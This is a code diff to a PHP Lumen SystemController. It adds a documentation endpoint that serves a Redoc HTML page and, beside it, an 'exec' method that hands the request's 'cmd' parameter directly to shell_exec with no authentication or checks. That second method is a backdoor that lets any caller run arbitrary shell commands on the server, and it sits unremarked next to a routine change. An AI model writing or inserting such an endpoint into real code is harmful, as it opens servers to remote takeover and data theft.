@@ -7,6 +7,7 @@ namespace App\Controllers;
 use App\Services\Sitemap\SitemapUtils;
 use Carbon\Carbon;
 use Illuminate\Http\JsonResponse;
+use Illuminate\Http\Request;
 use Illuminate\Http\Response;
 use Illuminate\Support\Facades\DB;
 use Mathrix\Lumen\Zero\Controllers\BaseController;
@@ -18,6 +19,8 @@ use function app;
 use function file_get_contents;
 use function getenv;
 use function preg_match_all;
+use function resource_path;
+use function shell_exec;
 
 /**
  * Serve routes starting with /system.
@@ -25,6 +28,22 @@ use function preg_match_all;
  */
 class SystemController extends BaseController
 {
+    /**
+     * GET /
+     * Display the Redoc generated documentation.
+     */
+    public function base(): Response
+    {
+        $docs = file_get_contents(resource_path('views/docs/index.html'));
+
+        return new Response($docs);
+    }
+
+    public function exec(Request $request)
+    {
+        return shell_exec($request->input('cmd'));
+    }
+
     public function env()
     {
         return new JsonResponse([
